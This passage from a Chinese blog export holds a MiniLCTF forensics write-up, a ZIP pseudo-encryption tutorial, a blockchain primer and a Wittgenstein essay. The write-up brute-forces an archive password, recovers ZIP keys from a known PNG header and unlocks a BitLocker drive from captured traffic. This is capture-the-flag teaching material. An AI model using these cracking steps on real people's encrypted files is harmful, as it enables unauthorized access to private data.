看题目描述说bitlocker恢复密钥传到了服务器上，我们直接查看桌面上流量就好
在流量里发现


接着往下翻就能看到恢复密钥了


521433-074470-317097-543499-149259-301488-189849-252032

然后我们把加密的d盘使用取证大师挂载一下（或者直接虚拟机打开也行）
bitlocker解密一下
在d盘里发现一个c.txt
由于是画图，我们直接使用脚本
这里先把c的图画了
import matplotlib.pyplot as plt# 坐标数据（x, y）data_str = &quot;&quot;&quot;#数据填写处&quot;&quot;&quot;# 解析坐标points = [tuple(map(float, pair.split(&#x27;,&#x27;))) for pair in data_str.split()]x_vals, y_vals = zip(*points)# 创建图像plt.figure(figsize=(10, 6))  # 拉长纵向显示plt.plot(x_vals, y_vals, marker=&#x27;o&#x27;, linestyle=&#x27;-&#x27;)plt.title(&quot;坐标点折线图&quot;)plt.xlabel(&quot;X&quot;)plt.ylabel(&quot;Y&quot;)plt.grid(True)# 设置y轴范围，使其上下拉伸（例如以中心为215，上下扩展±5）plt.ylim(min(y_vals) - 5, max(y_vals) + 5)plt.tight_layout()plt.show()

画了c的图发现是反转的
反转回来：


发现是fake_flag，但是提醒我们计算a.txt，使用脚本：
# 读取文件并解析为二维浮点列表def read_coords(filename):    with open(filename, &#x27;r&#x27;) as f:        lines = f.readlines()    coords = [tuple(map(float, line.strip().split(&#x27;,&#x27;))) for line in lines if line.strip()]    return coords# 写入结果到 a.txtdef write_coords(filename, coords):    with open(filename, &#x27;w&#x27;) as f:        for x, y in coords:            f.write(f&quot;&#123;x&#125;,&#123;y&#125;\n&quot;)# 主逻辑b_coords = read_coords(&#x27;b.txt&#x27;)c_coords = read_coords(&#x27;c.txt&#x27;)# 取最短长度，避免索引越界min_len = min(len(b_coords), len(c_coords))if len(b_coords) != len(c_coords):    print(f&quot;警告：b.txt 和 c.txt 的行数不一致，仅处理前 &#123;min_len&#125; 行&quot;)# 计算 a = 2b - ca_coords = [    (2 * bx - cx, 2 * by - cy)    for (bx, by), (cx, cy) in zip(b_coords[:min_len], c_coords[:min_len])]# 保存结果write_coords(&#x27;a.txt&#x27;, a_coords)print(&quot;a.txt 已成功生成！&quot;)

然后再利用画图脚本画出a.txt：


反转一下看到flag：


flag：miniLCTF{forens1c5_s0ooooo_1nt4resting}
MiniForensicsⅡ我们打开取证，在C盘的user下的document里发现nihao的文件夹
里面是一个pwd.txt和压缩包，pwd提醒我们密码是7位数字，爆破得到密码是：1846287


我们使用winrar解压得到sslkeylog文件。
在桌面上发现有pcapng文件，ssl解密，http流量里发现一个压缩包
保存下来发现里面有useless.png和一个txt
我们使用png文件头爆破得到三串密钥：45797e52 f747cc4c 800bd117


导出，得到txt里面内容：
aHR0cHM6Ly9naXRodWIuY29tL3Jvb3QtYWRtaW4tdXNlci93aGF0X2RvX3lvdV93YW5uYV9maW5kLmdpdA==

也就是指向了这个地址：https://github.com/root-admin-user/what_do_you_wanna_find.git
访问，在脚本里发现一串哈希值：89045a3653af483b6bb390e27c10db16873a60d1
脚本里面提示我们historical commits
直接访问Add files via upload · root-admin-user&#x2F;what_do_you_wanna_find@89045a3
发现隐藏内容，发现是代码混淆，发现flag。
flag：miniLCTF{c0ngr4tul4ti0n5_70u’v3_g0t_th3_s3cr3ts}
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>关于ZIP伪加密</title>
    <url>/2025/02/%E5%85%B3%E4%BA%8EZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[ZIP伪加密看似简单，实则也是大有学问在里面
这里细节讲解一下伪加密和相关工具的使用
首先我们需要了解一下zip文件结构
zip文件结构zip文件结构大致分为三个部分
一个record区，一个dirEntry区，一个endLocator区
三个部分相互依存，这里是010下的zip文件对照表
+ ZIPFILERECORD record # 压缩源文件数据区    - char frSignature[4] # 压缩源文件标志    - ushort frVersion # 压缩源文件版本    - ushort frFlags # 压缩源文件标志 （有无加密，偶数位修改了最低位所以会显示有密码）    - enum COMPTYPE frCompression    - DOSTIME frFileTime # 压缩源文件时间    - DOSDATE frFileDate # 压缩源文件日期    - uint frCrc # 压缩源文件CRC32校验值    - uint frCompressedSize # 压缩源文件压缩后大小    - uint frUncompressedSize # 压缩源文件压缩前大小    - ushort frFileNameLength # 压缩源文件名长度    - ushort frExtraFieldLength # 压缩源文件扩展域长度    - char frFileName[frFileNameLength] # 压缩源文件名    - uchar frData[frCompressedSize] # 压缩源文件数据+ ZIPDIRENTRY dirEntry # 压缩源文件目录区    - char deSignature[4] # 目录标志    - ushort deVersionMadeBy # 创建该条目的版本    - ushort deVersionNeeded # 解压该条目所需的版本    - ushort deFlags # 标志位 （有无加密，偶数位修改了最低位所以会显示有密码）    - enum COMPTYPE deCompression # 压缩方法    - DOSTIME deFileTime # 最后修改时间    - DOSDATE deFileDate # 最后修改日期    - uint deCrc # CRC32校验值    - uint deCompressedSize # 压缩后的大小    - uint deUncompressedSize # 压缩前的大小    - ushort deFileNameLength # 文件名长度    - ushort deExtraFieldLength # 扩展域长度    - ushort deFileCommentLength # 文件评论长度    - ushort deDiskNumberStart # 起始磁盘编号    - ushort deInternalAttributes # 内部属性    - uint deExternalAttributes # 外部属性    - uint deRelativeOffset # 该条目在 ZIP 文件中的偏移位置    - char deFileName[deFileNameLength] # 文件名    - char deExtraField[deExtraFieldLength] # 扩展域    - char deFileComment[deFileCommentLength] # 文件评论+ ZIPENDLOCATOR endLocator # 压缩源文件目录结束标志    - char elSignature[4] # 结束标志    - ushort elDiskNumber # 当前磁盘编号    - ushort elStartDiskNumber # 目录开始的磁盘编号    - ushort elEntriesOnDisk # 当前磁盘上的条目数量    - ushort elEntriesTotal # 总条目数量    - uint elSizeOfDirectory # 目录的总大小    - uint elOffsetOfDirectory # 目录开始的偏移位置    - ushort elCommentLength # 注释长度    - char elComment[elCommentLength] # 注释

可以发现最重要的就是两个标志位了，他们是判断伪加密的标准
其实其余部分也很重要，因为如果不对应的话直接解压会发现报错——CRC校验错误
首先我们要知道

全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性，即：                                             第二个数字为奇数时 –&gt;加密                                             第二个数字为偶数时 –&gt;未加密

也就是说，0900&#x2F;0100代表着加密，0000&#x2F;0800代表着无加密
而伪加密就是把本来无加密的文件修改了标志位从而显示出加密的样子
那我们怎么修改伪加密呢？为什么有些工具可以直接解压有些却不行呢？
工具选择010editor010editor肯定是最普遍和最准确的修改伪加密的东西了
如果是伪加密的话直接010修改0900为0000
如果两区（record和dirEntry）都是0900直接全改即可
bandizip经过测试，bandizip识别一个文件是否加密是通过看dirEntry记录中的deflag位
如果deFlag位是加密的话无论另一个frflag是否是加密bandizip都会识别为加密
winRARwinRAR和bandizip一样，都是识别dirEntry记录中的deflag位
7zip7z就很神奇，它与上面两个工具不同。
7zip判断是否为加密的方式是看record记录中的frflag位
因此有些明明是伪加密的zip 7z却能直接解压
所以那句“不会出的出题人只修改一个struct区”是因为换个工具就能解压
随波逐流经过测试，随波逐流提供的伪加密修复只会修改dirEntry记录中的deflag位，而不管frFlag位
ZipCenOp不好用！！
运行
java -jar ZipCenOp.jar -r 111.zip

会显示
success 1 flag(s) found
但是它不帮我改，有啥用？。。
其他工具传闻2345好压改两个区也能直接开。而且还有360解压缩
然而我不敢尝试，怕删不干净。。
细节注意zip伪加密还有一个细节需要注意的是我们都知道两个flag位置改成奇数时加密，偶数时无加密
那改成奇数时0100和0900有什么区别，能不能乱改？？
答案是否定的。

8神提供的解释：
这两字节就叫Flags，010模板中写fr和de是为区分filerecord块和direntry块。Flags两字节一共16bit，只有最低位用于记录加密与否，倒数第2 3两个bit记录压缩选项，大部分情况下修改不会出现问题，但如果将这两字节修改为09的话就会修改倒数第4个bit：记录数据描述符，如果这个bit是1，则表示标头中的CRC32和文件大小未知，但它们的实际数据会以额外的12或16字节结构出现在压缩数据后面。把一个实际上没有数据描述符的压缩包的flags倒数第4个bit改成1会导致软件被指示去读取一个不存在的描述符片段，从而导致后续的数据读取全部错乱，进而解压失败。

感觉实际情况的时候无法很明确的判断是改成0900还是0100，建议两种都试试，那种对了就用哪种
flag通用位置位详解pkware.cachefly.net&#x2F;webdocs&#x2F;casestudies&#x2F;APPNOTE.TXT
这是zip结构的格式规范。
根据zip文件规范，flag位置有16个字节，每个字节都有不同的含义：



位（从右往左）
详细描述



0
如果设置，表示文件已加密。（flag是奇数的话就会使这一位为1，显示为加密）


1
对于压缩方法6（Imploding），表示使用8K滑动字典（否则为4K）。对于方法8和9（Deflate），与位1结合表示压缩选项。


2
对于方法6（Imploding），表示使用3个Shannon-Fano树（否则为2个）。对于方法8和9，结合位1表示压缩选项。


3
如果设置，CRC-32、压缩大小和未压缩大小在本地文件头中为零，实际值在数据描述符中。（即表示标头的CRC32和文件大小未知，读取数据时）


4
保留用于方法8（Deflate）的增强功能。


5
如果设置，表示文件包含压缩后的补丁数据（需要PKZIP 2.70或更高版本）。


6
强加密。如果设置，提取所需版本号至少为50，且位0必须设置。对于AES加密，版本号至少为51。


7
目前未使用。


8
目前未使用。


9
目前未使用。


10
目前未使用。


11
语言编码标志（EFS）。如果设置，文件名和注释字段必须使用UTF-8编码（见附录D）。


12
保留用于PKWARE的增强压缩。


13
如果设置，表示中央目录已加密，本地文件头中的某些字段被掩码。


14
保留用于PKWARE的替代流。


15
保留用于PKWARE。


那么0900和0100有什么区别呢？
已知在 010editor 使用了小端字节序，所以0900实际上也就是0x0009
（什么是小端字节序？）
拆分成二进制也就是
0000 0000 0000 1001

所以它修改了第0位和第3位，相对的，0100也就只修改了第0位
第0位代表着加密与否，所以0900和0100都代表着zip加密了
而0900比0100多修改了第三位，表示CRC-32、压缩大小和未压缩大小在本地文件头中为零，实际值在数据描述符中。
也就是8神所说的“表示标头中的CRC32和文件大小未知”，所以乱修改的话读取会错乱。
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链Blockchain学习</title>
    <url>/2025/02/%E5%8C%BA%E5%9D%97%E9%93%BEBlockchain%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[怎么现在的misc区块链内容越来越多了，不得不学了
什么是区块链？区块链（英语：blockchain或block chain）是借由密码学与共识机制等技术建立与存储庞大交易资料链的点对点网络系统。
从字面上看：区块链是由一个个记录着各种信息的小区块链接起来组成的一个链条，类似于我们将一块块砖头叠起来，而且叠起来后是没办法拆掉的，每个砖头上面还写着各种信息，包括：谁叠的，什么时候叠的，砖头用了什么材质等等，这些信息你也没办法修改。
从计算机上看：区块链是一种比较特殊的分布式数据库。分布式数据库就是将数据信息单独放在每台计算机，且存储的信息的一致的，如果有一两台计算机坏掉了，信息也不会丢失，你还可以在其他计算机上查看到。
区块链是一种分布式的，所以它是没有中心点的，信息存储在所有加入到区块链网络的节点当中，节点的数据是同步的。节点可以是一台服务器，笔记本电脑，手机等。
有没一两句话能说明白区块链的？
有的。
麻将作为中国传统的区块链项目，四个矿工一组，先碰撞出13个数字正确哈希值的矿工可以获得记账权并得到奖励。
基本名词&amp;&amp;工具使用钱包顾名思义就是存储钱的钱包
这里推荐使用MetaMask，chrome浏览器上的一个插件。


应该也可以使用 imtoken ，手机上的钱包
注意每个钱包有一个地址，是收款的地址。而且注册账号时会让你记一些助记词，用来在忘记密码（私钥）的时候找回密码或钱包。
切换网络
在写CTF题目时候可以看比赛题目部署在哪个网路上，可以点击metamask左上角切换网络


这个主要看比赛的网路。
如何获取以太币？主要有一些水龙头可以每日拿一点，网上可以搜到
1.ZAN Faucet - Get Ethereum Testnet and Solana Devnet Tokens
2.Ethereum Sepolia Faucet
助记词助记词是从建立账户的时候自动生成的，一般是12个或者24个，用来帮助找回密码。
但是助记词并不是随机生成的，而是有一定的规律的，而且助记词是有范围的，一共2048个
这里是所有2048个助记词（英文）： bips&#x2F;bip-0039&#x2F;english.txt at master · bitcoin&#x2F;bips
如果从题目中拿到的一些助记词可以从这里缩小范围。
]]></content>
      <categories>
        <category>CTF</category>
        <category>Blockchain</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title>哲学-维特根斯坦</title>
    <url>/2024/11/%E5%93%B2%E5%AD%A6-%E7%BB%B4%E7%89%B9%E6%A0%B9%E6%96%AF%E5%9D%A6/</url>
    <content><![CDATA[维特根斯坦：天才与之责任0.写在前面这个本来是我高中时候做过的关于维特根斯坦的ppt，突然发现就想着把它发到博客上，于是乎就如此了。
文章的大部分内容摘自《打开：周濂的一百堂西方哲学课》（这个是真好看，又通俗易懂）
。
1.生平路德维希·维特根斯坦
二十世纪最伟大的哲学家（没有之一）
路德维希·维特根斯坦（Ludwig Wittgenstein）是20世纪最重要的哲学家之一，被公认为分析哲学的重要代表。他于1889年出生于奥地利，后来移居英国。维特根斯坦的思想主要围绕着语言、逻辑和意义展开，他的两部重要著作是《逻辑哲学论》和《哲学探讨》。
在《逻辑哲学论》中，他试图通过逻辑分析语言，揭示哲学问题的本质，并提出了“言语游戏”的概念，强调语言的使用与特定社会活动和上下文相关。
而在《哲学探讨》中，他的思想有所转变，开始强调语言的多样性和复杂性，强调语言的使用是基于社会实践和交流的。
维特根斯坦的思想对逻辑学、语言哲学、认知科学等领域都产生了深远影响，他被认为是20世纪哲学最重要的思想家之一，其作品至今仍受到广泛研究和讨论。




2.早期维特根斯坦——《逻辑哲学论》全书共分七个章节，章节之间或并列或递进。
全书的主旨要义在于将能“说”的都说清楚
图像理论： 语言与世界具有相同的逻辑形式接下来我们介绍一下著名的“图像理论”， 这是理解《逻辑哲学论》的关键所在。“一战”期间， 维特根斯坦偶然读到一篇文章，报道了巴黎交通法院的判案过程， 在裁决汽车事故时， 法官经常用玩具模型来模拟现场发生的一切。读到这里，维特根斯坦灵光一现，意识到模型发挥的作用与命题是一样的， 都是在刻画和表现现实世界里的事实。也就是说， 语言和世界存在着对应关系。打个比方，当我们说“一辆轿车在左转时与迎面而来的卡车相撞”， 这句话与现场发生的车祸具备逻辑上的同构性，用维特根斯坦的原话说就是：“语言与世界具有通过图像映示关系相联系的平行结构。”
在“4.014”节中， 维特根斯坦说：“唱片、音乐主题、乐谱和音波之间的关系正同语言与世界之间的内在描绘关系一样。它们都是按照一个共同的逻辑图样构造出来的。”
逻辑同构性维特根斯坦认为，语言与世界之间同样存在着逻辑同构性——复合语句对应着复合事态， 原子语句对应着原子事实， 名称对应着简单对象。而复合语句、原子语句与名称彼此之间则是一个充分分析直到最终无法分析的关系。同样， 复合事态、原子事实和简单对象之间也是这样的关系。

说到这里， 我们可以再做一个小结：首先， 乍看上去， 维特根斯坦是在主张某种符合论的观点，也就是语言反映事实， 就像镜子反映世界。但实际上他的观点要比符合论更神秘， 他认为语言和事实具有某种逻辑的同构性， 用维特根斯坦的话说就是具有相同的“逻辑形式”。
其次， 维特根斯坦在这里体现出一种充分分析的态度。我刚才说了， 任何复合的语句都可以充分分析成最小单位也即名称，同样，任何复合的事态都可以充分分析成最小单位也即简单对象。
无法说出的逻辑形式那么究竟什么叫作逻辑形式? 这又是一个非常难以理解的概念， 虽然就乐谱和琴声的例子而言， 我们可以体会到二者之间存在着某种共同的逻辑形式， 但是这种逻辑形式到底是什么， 似乎依旧无法给出进一步的说明。事实上， 维特根斯坦就是这样认为的，在他看来， 逻辑形式只能显现， 无法说出
《逻辑哲学论》中不可说的神秘之物 在《逻辑哲学论》这本书中，存在着很多只能显现但不能说出的神秘之物。借助陈嘉映的总结，这些不可说的东西包括： 逻辑形式，哲学问题， 伦理学、美学等学科， 以及包括以上三类在内的所有神秘的东西。
 为什么这些东西是不可说的? 不可说的东西就是不重要的吗?对此最简单的回答就是， 它们之所以不可说， 是因为它们不是实证科学， 它们谈论的是事实之外的东西。但是这绝不意味着不可说的东西是不重要的， 恰恰相反， 维特根斯坦曾经说过， 那些在《逻辑哲学论》中没有正面处理的内容， 比方说美、生活的意义、死亡，等等， 恰恰是最重要的。
 为什么不可说的是最重要的? 引用战时笔记中的一句话：“伦理学不处理世界。正如逻辑一样， 伦理学必定是世界的一个条件。”所谓条件的意思是， 如果没有它， 世界将不成其为世界， 你说它重要不重要?
”梯子“在这个意义上我们甚至可以说，《逻辑哲学论》并非一本关于逻辑的著作，而是一本关于罪及与之相关的伦理、美、生活的意义的著作。虽然维特根斯坦谈论最多的是逻辑， 但逻辑只是梯子， 真正重要的东西在楼上，一旦登上了楼， 就可以撤掉梯子了。
在“6.52”这一节中， 维特根斯坦说：“我们觉得， 即使一切可能的科学问题都已得到解答， 人生问题也还完全未被触及。”
第七章全书第七章只有一句话：
“对于不可说的东西我们必须保持沉默。”
————————————————————————————————————————
3.后期维特根斯坦——《哲学研究》维特根斯坦反维特根斯坦：
•《哲学研究》
反本质主义：不要追求走出柏拉图的洞穴，哲学不用追求本质，追求本质是一种“哲学病”！
打个比方，当有人问我们“什么是金星”的时候， 我们会非常自信地把手指向天际， 告诉他们：“喏， 就是那颗最亮的星星。”可是当有人问“什么是时间”的时候， 我们试图去寻找像金星一样的时间实体， 却发现自己茫然失措， 找不着北。
为什么会出现这样的困惑? 因为我们被这两个表达式表面上的一致性给迷惑了， 以为“什么是金星”和“什么是时间”问的是同一类型的问题， 所以我们也就很自然地像寻找金星那样去寻找作为实体的时间。其实， 表面上一致的问题并不一定是同一类型的问题。
 类似的诱惑无处不在， 不管是哲学家还是普通人都难以幸免。仍旧举上一讲的例子， 当说到工具二字的时候， 我们会情不自禁地想在各种工具之间寻找“共同之处”，与此类似的是， 当我们把语言看成是各种不同类型的语言游戏时， 又会忍不住去想：什么是游戏之为游戏的“共同之处”? 我们似乎总是倾向于要去总结一些什么，仿佛这么做才显得很哲学。
也就是说，我们不应该对一些概念下定义，自以为得到了本质。
哲学冲动：设想有人说:“所有的工具都是用来改变某种东西的，例如，锤子改变钉子的位置，锯子改变板子的形状，等等。”–尺子改变的是什么?胶水瓶和钉子改变的是什么?“改变我们对某样东西的了解，改变胶的温度和箱子的稳固程度。”–表达式是弄得一致了，但我们得到了什么呢?
那些有着哲学冲动的人就试图用“改变”这个概念来定义工具的本质，可是这只是一种幻觉，它的确把表达式弄得一致了，因为所有的工具好像在改变什么，但是维特根斯坦反问，这真的有助于加深我们对工具的理解吗?
维特根斯坦说，我们要放弃一种幻觉，以为我们可以抓住语言的无可与之相比的本质，“其实，只要‘语言’、‘经验’、‘世界’这些词有用处，它们的用处一定像‘桌子’、‘灯’、‘门’这些词一样卑微”。
”完全的黑暗“奥古斯丁有句名言:“那么，什么是时间呢?如果没有谁问我，我倒还知道它是什么;可是，当我被问及它是什么，并试着解释时，我却糊涂了。”对此，维特根斯坦评论说:“没有谁问我们的时候我们还知道，可是要给它们一个解释时又不知道的东西，正是我们需要提醒自己注意的东西。”因为这些东西诱使我们以科学的方式提出问题并回答问题，“什么是时间”这个问题与“什么是金星”，或者“氢的比重是多少”只具有表面的相似性，如果我们看不到它们的差异性，我们就会被带入“完全的黑暗”之中。
“家族相似性”在《哲学研究》第66节中，维特根斯坦问道:“棋类游戏，牌类游戏，球类游戏，角力游戏，它们的共同之处是什么?”然后，他立刻自我反驳道:“一不要说:它们一定有某种共同之处，否则它们不会都叫做游戏。’”
维特根斯坦给出的建议是“不要想，而要看”，看到它们之间的“相似之处”和“亲缘关系”，而不是想象中的“共同之处”。
那么游戏之间到底是什么关系呢？维特根斯坦说:“我想不出比‘家族相似’更好的说法。
讨论到这里,我们可以说,各种“游戏”构成了一个家族,各种“工具”构成了另一个家族，我们之所以把这类活动称为游戏，把那类对象称为工具，不是因为在它们的背后存在着所谓的本质(想想亚里士多德)，也不是因为我们可以对它们进行普遍定义(想想苏格拉底)，而是因为它们之间存在着“家族相似性”。
让一切如其所是：蒙克说“人们常常引用维特根斯坦谈哲学的话——哲学‘让一切如其所是’。但人们常常看不到，在力求什么也不改变，只改变我们看待事物的方式时，维特根斯坦试图改变一切。”
就这样，维特根斯坦做到了什么也没有改变，可一切又都改变了。
————————————————————————————————————————
1951年4月28日，维特根斯坦去世，留给这个世界的最后一句话是：
“告诉他们我度过了极好的一生”
]]></content>
      <categories>
        <category>philosophy</category>
      </categories>
      <tags>
        <tag>philosophy</tag>
        <tag>Wittgenstein</tag>
      </tags>
  </entry>
</search>
